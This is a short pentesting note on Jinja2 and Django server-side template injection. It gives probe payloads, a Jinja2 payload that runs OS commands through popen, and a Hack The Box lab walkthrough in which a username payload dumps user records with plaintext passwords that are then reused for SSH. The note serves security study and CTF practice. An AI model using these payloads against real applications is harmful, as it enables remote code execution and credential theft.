---
note_tags:
  - python
  - jinja2
  - rce
  - flask
  - recon
  - template-injection
---
# Jinja2 SSTI

**Author:** Julien Bongars\
**Date:** 2025-10-07 17:49:03
**Path:**

---

## Server Side Template Injection

```txt
{{8*8}}
{{7*7}}
${7*7}
<%= 7*7 %>
```

If you get `64` / `49`, it is evaluating. Identify the engine, then go for RCE.

```txt
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Django templates (not Jinja) often leak objects instead of RCE. HTB **Hacknet** is that case: the username is interpolated into a template that can dump the user table via `{{ users.values }}` — see [Hacknet write-up](/write-ups/hacknet/).

## HTB Hacknet — SSTI in username

Setting the profile username and then manipulating likes renders the objects shown in the likes list:

```txt
username={{users.values}}
```

Filtering for emails on `hacknet.htb` dumps `deepdive`:

```txt
{
 'id': 22,
 'email': 'deepdive@hacknet.htb',
 'username': 'deepdive',
 'password': 'D33pD!v3r',
 'picture': '22.png',
 'about': 'Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.',
 'contact_requests': 0,
 'unread_messages': 0,
 'is_public': False,
 'is_hidden': False,
 'two_fa': True
}
```

Logging in as `deepdive` shows a single friend: `backdoor_bandit`. Same technique:

```txt
{"id": 18, "email": "mikey@hacknet.htb", "username": "backdoor_bandit", "password": "mYd4rks1dEisH3re", "picture": "18.jpg", "about": "Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.", "contact_requests": 0, "unread_messages": 0, "is_public": False, "is_hidden": False, "two_fa": True}
```

2FA was set on the account but not enforced on SSH — password worked as `mikey`.

## Resources

- [PayloadsAllTheThings — Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2) — SSTI probes and RCE
- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) — engine identification
- [HTB Hacknet](/write-ups/hacknet/) — Django `{{ users.values }}` dump
